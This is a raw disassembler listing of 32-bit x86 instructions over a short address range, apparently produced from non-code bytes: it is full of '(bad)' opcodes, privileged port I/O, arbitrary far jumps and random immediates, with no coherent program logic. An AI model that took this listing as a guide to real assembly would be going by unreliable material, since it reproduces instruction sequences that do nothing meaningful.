  4276c5:	pusha  
  4276c6:	mov    ch,0xef
  4276c8:	mov    ds:0xae516351,eax
  4276cd:	aad    0xe7
  4276cf:	mov    ecx,0x852e7402
  4276d4:	push   cs
  4276d5:	scas   eax,DWORD PTR es:[edi]
  4276d6:	sti    
  4276d7:	retf   0x606b
  4276da:	(bad)  
  4276db:	das    
  4276dc:	dec    ebp
  4276dd:	div    DWORD PTR [esi+edx*4+0x1b]
  4276e1:	jno    0x4276d1
  4276e3:	jle    0x4276b7
  4276e5:	cwde   
  4276e6:	or     al,0x81
  4276e8:	outs   dx,BYTE PTR ds:[esi]
  4276e9:	fwait
  4276ea:	xor    ebp,DWORD PTR [ebp-0x491126ba]
  4276f0:	out    dx,eax
  4276f1:	cmpps  xmm7,xmm4,0x86
  4276f5:	daa    
  4276f6:	out    0xfe,eax
  4276f8:	xchg   esi,eax
  4276f9:	push   esi
  4276fa:	push   edi
  4276fb:	das    
  4276fc:	nop
  4276fd:	push   ebx
  4276fe:	aaa    
  4276ff:	popa   
  427700:	imul   ebp,DWORD PTR [ebp+0x67],0xffffffdd
  427704:	arpl   WORD PTR [ecx],dx
  427706:	loop   0x4276a9
  427708:	xor    eax,0x196af3fe
  42770d:	mov    dh,0xb1
  42770f:	out    0xdf,eax
  427711:	cmp    cl,0xf0
  427714:	clc    
  427715:	(bad)  
  427716:	adc    BYTE PTR [eax+eax*8],ah
  427719:	and    ch,dh
  42771b:	mov    ch,0x71
  42771d:	pop    es
  42771e:	dec    eax
  42771f:	repnz repnz pusha 
  427722:	cwde   
  427723:	pop    es
  427724:	ja     0x4276fc
  427726:	shr    BYTE PTR [eax],0x3f
  427729:	xchg   edi,esp
  42772b:	fst    DWORD PTR [ebx-0x7ba6cf79]
  427731:	mov    al,ds:0x5ae142e0
  427736:	(bad)  [ebp+ebx*1+0x4fce03b1]
  42773d:	popa   
  42773e:	in     eax,0x61
  427740:	xor    bh,BYTE PTR [edi]
  427742:	loope  0x4276f5
  427744:	pop    esi
  427745:	test   BYTE PTR [edx+0x4a],ch
  427748:	lahf   
  427749:	mov    ds:0x614e30b1,al
  42774e:	adc    edi,DWORD PTR [eax]
  427750:	imul   BYTE PTR [esi+0x9]
  427753:	cmp    DWORD PTR [edi+0x3ee7ee76],esp
  427759:	ds scas eax,DWORD PTR es:[edi]
  42775b:	cmp    eax,0xa124a5d6
  427760:	rol    ah,0x61
  427763:	adc    BYTE PTR [ecx+0x5e8ce9c2],cl
  427769:	mul    esi
  42776b:	xlat   BYTE PTR ds:[ebx]
  42776c:	push   ecx
  42776d:	xchg   edi,eax
  42776e:	dec    esi
  42776f:	sub    eax,0xa103253f
  427774:	shr    ch,1
  427776:	dec    ecx
  427777:	jns    0x427794
  427779:	dec    esi
  42777a:	aaa    
  42777b:	pop    ecx
  42777c:	pop    edi
  42777d:	inc    eax
  42777e:	jb     0x42770f
  427780:	cdq    
  427781:	leave  
  427782:	jle    0x427795
  427784:	out    0x6,al
  427786:	dec    ebx
  427787:	mov    eax,ds:0x1ab8739a
  42778c:	mov    DWORD PTR [ecx-0x61c5bed1],eax
  427792:	popa   
  427793:	mov    ?,WORD PTR [ebx]
  427795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427796:	out    dx,al
  427797:	adc    ebx,eax
  427799:	push   es
  42779a:	mov    bh,0xe5
  42779c:	(bad)  
  42779d:	mov    ebp,0xba99a16f
  4277a2:	div    DWORD PTR [edx-0x21ab4fb8]
  4277a8:	jb     0x427796
  4277aa:	cli    
  4277ab:	cld    
  4277ac:	std    
  4277ad:	jmp    0xe281:0x361ea180
  4277b4:	pop    edx
  4277b5:	sbb    DWORD PTR [ebx],edx
  4277b7:	lods   al,BYTE PTR ds:[esi]
  4277b8:	je     0x427766
  4277ba:	outs   dx,BYTE PTR ds:[esi]
  4277bb:	adc    eax,DWORD PTR [edx+0x6c]
  4277be:	jmp    0xeed514f6
  4277c3:	xchg   esp,eax
  4277c4:	loopne 0x427757
  4277c6:	sub    al,0xd9
  4277c8:	jecxz  0x4277c3
  4277ca:	in     al,dx
  4277cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277cc:	test   DWORD PTR [edx],ebp
  4277ce:	cmp    BYTE PTR [eax-0x4b],dh
  4277d1:	popa   
  4277d2:	push   cs
  4277d3:	loopne 0x427823
  4277d5:	lods   eax,DWORD PTR ds:[esi]
  4277d6:	xchg   ebx,eax
  4277d7:	(bad)  
  4277d8:	pop    esi
  4277d9:	inc    edx
  4277da:	push   0x65ef3bb2
  4277df:	ins    DWORD PTR es:[edi],dx
  4277e0:	xchg   esp,eax
  4277e1:	inc    eax
  4277e2:	loopne 0x4277cc
  4277e4:	fs pusha 
  4277e6:	mov    dh,BYTE PTR [edi-0x7bad6084]
  4277ec:	cmp    ch,0xee
  4277ef:	gs sti 
  4277f1:	pop    ds
  4277f2:	(bad)  
  4277f3:	mov    esi,0xa2e712a6
  4277f8:	sub    DWORD PTR [edx-0x7e33cf37],0x6e
  4277ff:	adc    al,0x2b
  427802:	mov    dl,0x4e
  427804:	pop    esi
  427805:	xchg   ebp,eax
  427806:	icebp  
  427807:	xor    DWORD PTR [esp+eax*1+0x50],eax
  42780b:	sub    eax,0x58e76106
  427810:	and    DWORD PTR [ecx],esi
  427812:	les    edx,FWORD PTR [edx+0x41]
  427815:	add    eax,0xfec46df0
  42781a:	mov    bh,0x60
  42781c:	out    dx,eax
  42781d:	call   0x6179c569
  427822:	arpl   ax,di
  427824:	sbb    eax,0x1e5d7290
  427829:	pop    ebx
  42782a:	and    BYTE PTR [eax-0x7d],cl
  42782d:	popa   
  42782e:	jmp    0x62662d53
  427833:	mov    esp,ebx
  427835:	sbb    eax,0x30d0a899
  42783a:	sbb    ebp,ebx
  42783c:	inc    esp
  42783d:	icebp  
  42783e:	adc    ecx,DWORD PTR [ebx+0x17e7ce3e]
  427844:	inc    edx
  427845:	adc    DWORD PTR [edi+0x3b],0xffffffde
  427849:	sbb    BYTE PTR [ecx],bl
  42784b:	or     al,0x2e
  42784d:	pop    ebp
  42784e:	mov    esp,0x7f89b458
  427853:	and    DWORD PTR [esp+ebp*1-0x78],esi
  427857:	test   BYTE PTR [esi+0x59],bl
  42785a:	ja     0x427841
  42785c:	xchg   ebx,eax
  42785d:	cdq    
  42785e:	outs   dx,DWORD PTR ds:[esi]
  427860:	xchg   esp,eax
  427861:	pusha  
  427862:	mov    esp,0x9edc2a11
  427867:	test   DWORD PTR [ebp+0x115beec6],ebp
  42786d:	retf   0xf58c
  427870:	or     bh,cl
  427872:	jle    0x427815
  427874:	or     eax,0x47582c38
  427879:	out    dx,eax
  42787a:	pusha  
  42787b:	jge    0x4278db
  42787d:	and    DWORD PTR [ebx-0x63],edi
  427880:	in     al,0xc1
  427882:	iret   
  427883:	inc    edi
  427884:	imul   ebx,DWORD PTR [ecx-0x1e],0xffffff84
  427888:	fld    QWORD PTR [ebx]
  42788a:	retf   0xc270
  42788d:	xor    DWORD PTR [eax-0x2b23a154],0x9bd266b8
  427897:	out    0x4a,al
  427899:	popa   
  42789a:	pop    es
  42789b:	int3   
  42789c:	mov    esp,0x43c27865
  4278a1:	shl    DWORD PTR [eax],cl
  4278a3:	jnp    0x42791c
  4278a5:	fld    DWORD PTR [esi]
  4278a7:	xlat   BYTE PTR ds:[ebx]
  4278a8:	les    bp,DWORD PTR [esi-0x4fbd63c5]
  4278af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278b0:	iret   
  4278b1:	jnp    0x4278a5
  4278b3:	push   ecx
  4278b4:	xchg   cl,bl
  4278b6:	sbb    eax,0x9018c391
  4278bb:	push   edi
  4278bc:	pop    esi
  4278bd:	jecxz  0x42789a
  4278bf:	fistp  WORD PTR [ebp-0x59]
  4278c2:	popf   
  4278c3:	ins    DWORD PTR es:[edi],dx
  4278c4:	popf   
  4278c5:	push   0xf9dee778
  4278ca:	ja     0x427922
  4278cc:	stos   DWORD PTR es:[edi],eax
  4278cd:	lods   eax,DWORD PTR ds:[esi]
  4278ce:	inc    esp
  4278cf:	lahf   
  4278d0:	pop    esi
  4278d1:	jo     0x427940
  4278d3:	popf   
  4278d4:	push   es
  4278d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278d6:	jg     0x427918
  4278d8:	xor    BYTE PTR [ebp+edi*8-0x2b],al
  4278dc:	xor    DWORD PTR [ecx-0x33b9d23e],esp
  4278e2:	ss (bad) 
  4278e4:	push   esp
  4278e5:	xlat   BYTE PTR ds:[ebx]
  4278e6:	(bad)  
  4278e7:	nop
  4278e8:	pop    esi
  4278e9:	jmp    0xd2137f90
  4278ee:	add    esp,DWORD PTR [ecx+0x72aab4b5]
  4278f4:	xor    edx,DWORD PTR [ebp-0x43894c93]
  4278fa:	push   edx
  4278fb:	add    al,0x5e
  4278fd:	out    0xca,al
  4278ff:	pop    ebp
  427900:	nop
  427901:	jmp    0x427959
  427903:	nop
  427904:	push   eax
  427905:	popa   
  427906:	and    eax,esp
  427908:	retf   
  427909:	push   eax
  42790a:	pop    eax
  42790b:	stc    
  42790c:	cmp    BYTE PTR [ebx+0x26],0xa5
  427910:	jl     0x427972
  427912:	pop    esp
  427913:	and    bh,BYTE PTR [eax+edx*8+0x610ac71b]
  42791a:	inc    DWORD PTR [ecx-0x4a]
  42791d:	imul   eax,DWORD PTR [eax-0x11d23b11],0x77
  427924:	mov    ds,WORD PTR [esi-0x4723c2d6]
  42792a:	mov    edx,0x6079f465
  42792f:	popa   
  427930:	out    0x13,eax
  427932:	inc    ebp
  427933:	stos   DWORD PTR es:[edi],eax
  427934:	jb     0x427975
  427936:	hlt    
  427937:	lock fimul WORD PTR [ebx]
  42793a:	aam    0x5e
  42793c:	pop    ebx
  42793d:	jmp    0x2176cb2c
  427942:	in     al,dx
  427943:	rol    DWORD PTR [edx],cl
  427945:	cmp    bl,BYTE PTR [edx-0x5f]
  427948:	sbb    ch,BYTE PTR [ebx-0x1a]
  42794b:	das    
  42794c:	xchg   edi,eax
  42794d:	xchg   DWORD PTR ds:0x5db8562e,esp
  427953:	jmp    0x9591:0x909dd596
  42795a:	retf   
  42795b:	pusha  
  42795c:	fild   WORD PTR [ecx-0xb]
  42795f:	data16 sbb bh,BYTE PTR [ebp+0x177e02ee]
  427966:	xor    dh,dl
  427968:	jnp    0x4279a0
  42796a:	and    esp,DWORD PTR [ecx-0x2f8cadc2]
  427970:	lahf   
  427971:	mov    WORD PTR [ecx],?
  427973:	(bad)  
  427974:	pop    esi
  427975:	pop    ss
  427976:	pop    edx
  427978:	jne    0x4279ca
  42797a:	icebp  
  42797b:	jle    0x427947
  42797d:	pusha  
  42797e:	fwait
  42797f:	mov    al,0xfe
  427981:	scas   eax,DWORD PTR es:[edi]
  427982:	sub    BYTE PTR [edi],ch
  427984:	in     al,dx
  427985:	sahf   
  427986:	pop    edx
  427987:	test   DWORD PTR [esi+0x73],ebx
  42798a:	rcl    DWORD PTR [esi-0x75879b61],1
  427990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427991:	mov    eax,0xe091a16f
  427996:	in     al,0x35
  427998:	call   esi
  42799a:	jmp    0x8dc3d80c
  42799f:	out    0x44,al
  4279a1:	scas   eax,DWORD PTR es:[edi]
  4279a2:	sub    al,0x1
  4279a4:	stos   DWORD PTR es:[edi],eax
  4279a5:	pusha  
  4279a6:	jecxz  0x427a19
  4279a8:	pop    es
  4279a9:	inc    esi
  4279aa:	and    BYTE PTR [ebp+eax*8-0x6f],ch
  4279ae:	out    dx,al
  4279af:	push   edx
  4279b0:	dec    ebp
  4279b1:	test   eax,0xd87d105f
  4279b6:	inc    ebx
  4279b7:	or     DWORD PTR [eax],esp
  4279b9:	pop    esp
  4279ba:	out    dx,eax
  4279bb:	jmp    0x56de:0x809388f7
  4279c2:	inc    ecx
  4279c3:	lock lea esp,[eax-0x1a]
  4279c7:	sub    DWORD PTR [ebx-0x73aa47ff],edx
  4279cd:	(bad)  
  4279ce:	(bad)  
  4279cf:	jle    0x427a4c
  4279d1:	inc    eax
  4279d2:	outs   dx,BYTE PTR ds:[esi]
  4279d3:	in     eax,0xa7
  4279d5:	and    al,0x77
  4279d7:	mov    ss,WORD PTR [edi+0x19f3a860]
  4279dd:	lods   eax,DWORD PTR ds:[esi]
  4279de:	adc    eax,0xeea7a09d
  4279e3:	mov    eax,0x2bca5265
  4279e8:	retf   0x95d5
  4279eb:	lahf   
  4279ec:	enter  0xc9b5,0x61
  4279f0:	ds out dx,eax
  4279f2:	sub    al,0xb6
  4279f4:	cmp    ebx,DWORD PTR [eax-0x572ccf15]
  4279fa:	inc    edx
  4279fb:	mov    edi,DWORD PTR [ebx-0x7b293368]
  427a01:	pusha  
  427a02:	fisttp DWORD PTR [esi+0x51060ba7]
  427a08:	inc    edx
  427a09:	stos   BYTE PTR es:[edi],al
  427a0a:	add    ch,BYTE PTR [edx-0x79]
  427a0d:	mov    ebp,DWORD PTR [esp+edx*2+0x4ff82c2c]
  427a14:	jle    0x427a4c
  427a16:	dec    esp
  427a17:	sbb    eax,0xdf6fb00e
  427a1c:	dec    ebx
  427a1d:	adc    eax,0x13652b02
  427a22:	mov    esi,0x55180122
  427a27:	popa   
  427a28:	inc    edx
  427a29:	mov    ah,0x54
  427a2b:	mov    eax,ds:0xccab01c9
  427a30:	(bad)  
  427a32:	cdq    
  427a33:	arpl   WORD PTR fs:[edi+ebp*1],cx
  427a37:	jne    0x427a2a
  427a39:	retf   0x1fe9
  427a3c:	add    eax,0x36562e57
  427a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a42:	in     eax,0xa7
  427a44:	adc    eax,0x5db19d19
  427a49:	adc    DWORD PTR [esi+0x74],edi
  427a4c:	ror    DWORD PTR [ebp-0x57030e12],cl
  427a52:	cmp    al,0xc3
  427a54:	xor    esi,esi
  427a56:	dec    ecx
  427a57:	mov    eax,ds:0xf34318b5
  427a5c:	enter  0xd24,0xde
  427a60:	push   edx
  427a61:	lods   eax,DWORD PTR ds:[esi]
  427a62:	pop    esi
  427a63:	scas   eax,DWORD PTR es:[edi]
  427a64:	pop    esi
  427a65:	es aam 0x30
  427a68:	dec    edx
  427a69:	lahf   
  427a6a:	stc    
  427a6b:	in     eax,dx
  427a6c:	push   ebx
  427a6d:	bound  esp,QWORD PTR [ecx]
  427a6f:	add    al,0x5e
  427a71:	adc    BYTE PTR [edi],0xb2
  427a74:	aas    
  427a75:	(bad)  
  427a76:	aad    0xa5
  427a78:	pop    esi
  427a79:	cmc    
  427a7a:	lods   al,BYTE PTR ds:[esi]
  427a7b:	aam    0x1a
  427a7d:	clc    
  427a7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a7f:	inc    ecx
  427a80:	xor    al,0x45
  427a82:	adc    edi,ebp
  427a84:	mov    ds:0xdeee3817,al
  427a89:	cdq    
  427a8a:	jmp    0xc66c09c9
  427a8f:	adc    cl,BYTE PTR [edi]
  427a91:	sub    bl,cl
  427a93:	cmc    
  427a94:	pop    esi
  427a95:	mov    esi,0x2941c622
  427a9a:	push   esi
  427a9b:	aas    
  427a9c:	add    al,0xb0
  427a9e:	into   
  427a9f:	sub    DWORD PTR [eax-0x6ab703b8],ebp
  427aa5:	and    bl,al
  427aa7:	hlt    
  427aa8:	pop    ebx
  427aa9:	aam    0x44
  427aab:	dec    esp
  427aac:	mov    bh,0x2e
  427aae:	mov    ds,WORD PTR [ecx-0x5ec98efd]
  427ab4:	sbb    eax,0xc159c4d6
  427ab9:	rcl    dh,0xee
  427abc:	pop    esi
  427abd:	fidiv  DWORD PTR [eax]
  427abf:	test   al,0xa
  427ac1:	test   BYTE PTR [eax],cl
  427ac3:	push   edi
  427ac4:	inc    ecx
  427ac5:	popa   
  427ac6:	gs sahf 
  427ac8:	add    eax,eax
  427aca:	popf   
  427acb:	mov    ds:0xdaee72ed,eax
  427ad0:	jl     0x427a8e
  427ad2:	push   edx
  427ad3:	add    ah,BYTE PTR [edi-0x4a]
  427ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ad7:	hlt    
  427ad8:	mov    ah,BYTE PTR [eax-0x13]
  427adb:	mov    gs:0x236508d9,eax
  427ae1:	fucomip st,st(6)
  427ae3:	push   esi
  427ae4:	xchg   ecx,eax
  427ae5:	sub    al,0xc8
  427ae7:	cmc    
  427ae8:	mov    eax,0x21ea6486
  427aed:	pop    esp
  427aee:	ds pop edi
  427af0:	lahf   
  427af1:	sub    ebx,esi
  427af3:	and    BYTE PTR [esi+0x5e199930],al
  427af9:	ins    DWORD PTR es:[edi],dx
  427afa:	es scas eax,DWORD PTR es:[edi]
  427afc:	in     eax,0x94
  427afe:	xchg   esi,eax
  427aff:	sbb    al,0x2e
  427b01:	pusha  
  427b02:	mul    BYTE PTR [bp+di+0x7c]
  427b06:	jp     0x427b59
  427b08:	cmp    esi,DWORD PTR [ecx]
  427b0a:	int    0x53
  427b0c:	aaa    
  427b0d:	fwait
  427b0e:	mov    dh,0x20
  427b10:	rcr    edi,cl
  427b12:	jno    0x427af8
  427b14:	data16 jnp 0x427ab3
  427b17:	call   0x7ade:0x9be51156
  427b1e:	sub    esp,DWORD PTR [ebp-0x77fe3db4]
  427b24:	xchg   ebx,eax
  427b25:	sti    
  427b26:	out    dx,al
  427b27:	pop    ebx
  427b28:	jae    0x427b39
  427b2a:	dec    edx
  427b2b:	dec    esp
  427b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b2d:	pusha  
  427b2e:	lods   eax,DWORD PTR ds:[esi]
  427b2f:	jae    0x427b85
  427b31:	xor    edi,DWORD PTR [edi-0x11a33ab4]
  427b37:	aad    0x1c
  427b39:	out    dx,al
  427b3a:	cmp    ch,BYTE PTR [eax-0x44]
  427b3d:	add    al,0xa7
  427b3f:	lea    esi,[eax-0x69]
  427b42:	sub    DWORD PTR [eax],esp
  427b44:	pop    eax
  427b45:	pop    es
  427b46:	out    dx,al
  427b47:	sahf   
  427b48:	xor    ebp,ecx
  427b4a:	xor    eax,ecx
  427b4c:	push   edx
  427b4d:	mov    bl,bh
  427b4f:	lea    ebx,[esi]
  427b51:	adc    BYTE PTR [esi],0xd4
  427b54:	inc    esp
  427b55:	mov    ?,WORD PTR [eax]
  427b57:	mov    eax,ds:0x59d6fb3a
  427b5c:	xchg   edx,eax
  427b5d:	int3   
  427b5e:	xchg   ebp,eax
  427b5f:	dec    esi
  427b60:	pop    esi
  427b61:	push   esi
  427b62:	sahf   
  427b63:	aad    0x84
  427b65:	lds    esi,FWORD PTR [ecx-0x29]
  427b68:	ss pop edx
  427b6a:	adc    eax,0x6ee9be0b
  427b6f:	inc    ecx
  427b70:	xchg   ebp,eax
  427b71:	in     eax,0xe0
  427b73:	sti    
  427b74:	pop    esi
  427b75:	sti    
  427b76:	neg    BYTE PTR [eax+eiz*2-0x56]
  427b7a:	xlat   BYTE PTR ds:[ebx]
  427b7b:	jp     0x427b94
  427b7d:	popa   
  427b7e:	cdq    
  427b7f:	mov    dh,0x5a
  427b81:	add    eax,0x36553d4c
  427b86:	out    dx,al
  427b87:	rcl    DWORD PTR gs:[ebp-0x510c7b79],1
  427b8e:	ret    
  427b8f:	mov    al,ds:0x8286de7b
  427b94:	cs jp  0x427b1f
  427b97:	hlt    
  427b98:	xchg   esp,eax
  427b99:	mov    dh,0x2e
  427b9b:	in     eax,0x40
  427b9d:	xchg   ebp,eax
  427b9e:	std    
  427b9f:	shl    bl,0x55
  427ba2:	aaa    
  427ba3:	pop    edx
  427ba4:	stos   DWORD PTR es:[edi],eax
  427ba5:	push   edi
  427ba6:	out    dx,al
  427ba7:	xor    esp,DWORD PTR [edx-0x7a]
  427baa:	mov    ah,0x52
  427bac:	arpl   WORD PTR [ebx],di
  427bae:	pushf  
  427baf:	add    al,0xe2
  427bb1:	add    BYTE PTR [esi+0xc],bh
  427bb4:	imul   DWORD PTR [eax-0x6d]
  427bb7:	mov    eax,ds:0x7cc70868
  427bbc:	int3   
  427bbd:	mov    ds:0x4436ba2b,al
  427bc2:	jne    0x427b54
  427bc4:	(bad)  
  427bc5:	pop    ebx
  427bc6:	scas   al,BYTE PTR es:[edi]
  427bc7:	fld    TBYTE PTR [esi+edi*8]
  427bca:	adc    DWORD PTR [esi-0x12],edx
  427bcd:	pusha  
  427bce:	pop    ebx
  427bcf:	lods   al,BYTE PTR ds:[esi]
  427bd0:	sub    DWORD PTR [edi],esp
  427bd2:	sbb    eax,ebp
  427bd4:	shl    BYTE PTR [edx+0x50019bee],1
  427bda:	fiadd  DWORD PTR [ecx+0x1b]
  427bdd:	pop    esi
  427bde:	pusha  
  427bdf:	call   0x1d5e:0x6a239864
  427be6:	stos   DWORD PTR es:[edi],eax
  427be7:	push   edi
  427be9:	cmp    ch,ah
  427beb:	adc    DWORD PTR [ebx-0x27],ebp
  427bee:	aaa    
  427bef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bf0:	and    DWORD PTR [ecx],esp
  427bf2:	pop    ss
  427bf3:	xor    DWORD PTR [edi-0x727cffa0],ecx
  427bf9:	add    DWORD PTR [ebx+ebx*8],edx
  427bfc:	hlt    
  427bfd:	scas   eax,DWORD PTR es:[edi]
  427bfe:	imul   DWORD PTR [ecx-0x561159e9]
  427c04:	rcr    DWORD PTR [edx+0x607595cf],0xfa
  427c0b:	and    eax,0x9a81f62b
  427c10:	les    ebx,FWORD PTR [ebp-0x12]
  427c13:	xor    eax,0xac6c7da3
  427c18:	shr    ebp,0x5c
  427c1b:	mov    eax,ds:0xd1030641
  427c20:	sub    eax,0x5e9f978d
  427c25:	pop    edi
  427c26:	retf   
  427c27:	scas   al,BYTE PTR es:[edi]
  427c28:	adc    al,0xd1
  427c2a:	(bad)  
  427c2b:	xchg   edi,eax
  427c2c:	fisub  WORD PTR [eax-0x68]
  427c2f:	cli    
  427c30:	mov    esi,0x5f9458ba
  427c35:	icebp  
  427c36:	out    dx,al
  427c37:	mov    edx,DWORD PTR [ecx-0x22]
  427c3a:	aas    
  427c3b:	bound  ebx,QWORD PTR [eax*8+0x583cb913]
  427c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c43:	mov    gs,WORD PTR [esp+edi*4+0x1c63a459]
  427c4a:	cmp    al,BYTE PTR [esi+ebp*2-0x12df9e31]
  427c51:	inc    eax
  427c52:	out    dx,al
  427c53:	add    BYTE PTR [esi-0x21959550],0xbf
  427c5a:	sub    BYTE PTR [ecx-0x40e16276],ah
  427c60:	jb     0x427c07
  427c62:	(bad)  
  427c64:	push   ecx
  427c65:	or     ecx,DWORD PTR [eax-0x3f]
  427c68:	popf   
  427c69:	and    DWORD PTR [edi-0x7d],ecx
  427c6c:	rol    BYTE PTR [edx],cl
  427c6e:	push   cs
  427c6f:	in     al,dx
  427c70:	mov    ah,BYTE PTR [eax+0x73]
  427c73:	cs jbe 0x427c6f
  427c76:	mov    ebx,DWORD PTR [eax-0x73]
  427c79:	mov    bl,0xee
  427c7b:	cmp    al,0x9a
  427c7d:	jb     0x427ca5
  427c7f:	sbb    esp,DWORD PTR [ecx-0x25f236e]
  427c85:	jle    0x427ca9
  427c87:	sub    BYTE PTR ds:0x6393c14f,0x27
  427c8e:	aas    
  427c8f:	inc    ebx
  427c90:	sbb    al,al
  427c92:	cli    
  427c93:	test   al,0xb8
  427c95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c96:	dec    esi
  427c97:	push   esp
  427c98:	xchg   ecx,eax
  427c99:	push   ecx
  427c9a:	leave  
  427c9b:	fidiv  DWORD PTR [ecx+0x55]
  427c9e:	scas   al,BYTE PTR es:[edi]
  427c9f:	xor    bh,0xd7
  427ca2:	cwde   
  427ca3:	push   0x7937445e
  427ca8:	mov    edi,0x244e17ad
  427cad:	popa   
  427cae:	jge    0x427d2c
  427cb0:	lods   eax,DWORD PTR ds:[esi]
  427cb1:	push   0x23fa2c7
  427cb6:	out    dx,al
  427cb7:	add    BYTE PTR [edx],ah
  427cb9:	fcomip st,st(6)
  427cbb:	aam    0xa5
  427cbd:	pop    ss
  427cbe:	pop    esp
  427cbf:	mov    eax,ds:0x9c07a505
  427cc4:	das    
  427cc5:	sub    al,0x4
  427cc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427cc8:	pop    esi
  427cc9:	gs or  esi,edx
  427ccc:	popa   
  427ccd:	jno    0x427cf4
  427ccf:	cmp    bh,0x52
  427cd2:	pop    ebx
  427cd3:	pop    edx
  427cd4:	jae    0x427ccb
  427cd6:	sub    eax,DWORD PTR [edi+0x10]
  427cd9:	push   eax
  427cda:	jle    0x427c79
  427cdc:	push   ecx
  427cdd:	addr16 loopne 0x427c81
  427ce0:	ins    BYTE PTR es:[edi],dx
  427ce1:	cmp    esi,ebx
  427ce3:	push   es
  427ce4:	nop
  427ce5:	push   ds
  427ce6:	inc    esp
  427ce7:	and    DWORD PTR [edi-0x64ae56a4],edi
  427ced:	shl    BYTE PTR [ecx],1
  427cef:	in     eax,dx
  427cf0:	xor    eax,0x84226c61
  427cf5:	fnstcw WORD PTR [edx-0x1855ee5b]
  427cfb:	stc    
  427cfc:	mov    bh,0x8d
  427cfe:	mov    eax,ds:0xe0613457
  427d03:	jbe    0x427d51
  427d05:	sbb    bl,bl
  427d07:	mov    al,ds:0xe489c039
  427d0c:	rcl    DWORD PTR ds:0xa15e941b,1
  427d12:	ins    DWORD PTR es:[edi],dx
  427d13:	aas    
  427d14:	mov    al,0x9c
  427d16:	call   0xf7a6e257
  427d1b:	and    al,0xe4
  427d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d1e:	sahf   
  427d1f:	hlt    
  427d20:	mov    esi,0x340a7e05
  427d25:	mov    dl,0x64
  427d27:	sub    BYTE PTR [esi+0x1c],bl
  427d2a:	test   al,0x4a
  427d2c:	mov    eax,ds:0x8f455bc0
  427d31:	pusha  
  427d32:	mov    ecx,0x8b3196b9
  427d37:	aaa    
  427d38:	cld    
  427d39:	push   edi
  427d3a:	fsub   DWORD PTR [eax]
  427d3c:	pop    esi
  427d3d:	lods   eax,DWORD PTR ds:[esi]
  427d3e:	sbb    BYTE PTR [edi+0x63],bh
  427d41:	cmp    dh,dh
  427d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d44:	int    0xb2
  427d46:	pushf  
  427d47:	mov    ds:0x31c90d95,eax
  427d4c:	sub    eax,0xcf91aea1
  427d51:	js     0x427d41
  427d53:	aas    
  427d54:	push   ds
  427d55:	fsubr  QWORD PTR [ecx+0x3bafeb5d]
  427d5b:	mov    al,ds:0xa4c41f22
  427d60:	mov    esi,0xd3d2f49
  427d65:	fsubr  st,st(6)
  427d67:	orps   xmm4,XMMWORD PTR [esi-0x4431becc]
  427d6e:	sub    DWORD PTR [eax+0x7d91a864],0x37
  427d75:	mov    eax,ds:0x196cbe70
  427d7a:	in     eax,dx
  427d7b:	inc    BYTE PTR [ecx]
  427d7d:	lods   al,BYTE PTR ds:[esi]
  427d7e:	dec    ebp
  427d7f:	cmp    dl,bh
  427d81:	push   ss
  427d82:	(bad)  
  427d83:	in     eax,0x9
  427d85:	daa    
  427d86:	imul   esp,DWORD PTR [ecx-0xd88ce66],0xffffff9d
  427d8d:	mov    eax,ds:0xd25eff9b
  427d92:	stos   DWORD PTR es:[edi],eax
  427d93:	ret    0xfb54
  427d96:	push   esp
  427d97:	jge    0x427d9e
  427d99:	popa   
  427d9a:	pop    esi
  427d9b:	pop    edx
  427d9c:	mov    ebp,0x2d874af6
  427da1:	test   ebp,ebp
  427da3:	or     al,0x21
  427da5:	cmp    dh,0xa9
  427da8:	and    al,0xbc
  427daa:	dec    ecx
  427dab:	mov    dh,0x9a
  427dad:	mov    ds:0x75b3a0de,eax
  427db2:	add    DWORD PTR [edi+0x625f8419],edx
  427db8:	pop    esi
  427db9:	or     bh,0x3c
  427dbc:	daa    
  427dbd:	mov    bh,BYTE PTR [edi+0x51611f79]
  427dc3:	les    edx,FWORD PTR [ebp-0x1d12cd1f]
  427dc9:	(bad)  
  427dca:	out    dx,al
  427dcb:	cmp    eax,0xfa70d12f
  427dd0:	xor    BYTE PTR [edi],al
  427dd2:	jge    0x427d73
  427dd4:	cmp    dh,al
  427dd6:	loopne 0x427d60
  427dd8:	adc    esp,DWORD PTR [ecx]
  427dda:	in     al,0xa2
  427ddc:	mov    DWORD PTR [ebx+0x3],0x99295af9
  427de3:	sub    DWORD PTR [ebx+0x65],0x2e
  427de7:	fild   DWORD PTR [edi+0x77a118bb]
  427ded:	push   ecx
  427dee:	adc    dh,ch
  427df0:	retf   0x39c
  427df3:	sbb    DWORD PTR [edi+edx*4+0x7],esp
  427df7:	aaa    
  427df8:	and    al,0x21
  427dfa:	jae    0x427e01
  427dfc:	sbb    ecx,DWORD PTR [ebp+0x1036a18e]
  427e02:	cmp    BYTE PTR [edi-0x44],ch
  427e05:	mov    ds:0xab32fe9d,eax
  427e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e0b:	mov    ds:0xc39b9064,al
  427e10:	mov    ds,WORD PTR [esi+eax*2+0x23]
  427e14:	int    0x60
  427e16:	mov    eax,0x133b80e
  427e1b:	loopne 0x427e84
  427e1d:	lods   al,BYTE PTR ds:[esi]
  427e1e:	out    dx,al
  427e1f:	fistp  DWORD PTR [edi]
  427e21:	shl    BYTE PTR [ecx+0x1d],cl
  427e24:	rcl    DWORD PTR [eax-0x4da75f0f],0x9b
  427e2b:	rol    DWORD PTR [esi+0x5e8cbff5],1
  427e31:	(bad)  
  427e33:	call   0x2ef74f49
  427e38:	dec    ebx
  427e39:	popa   
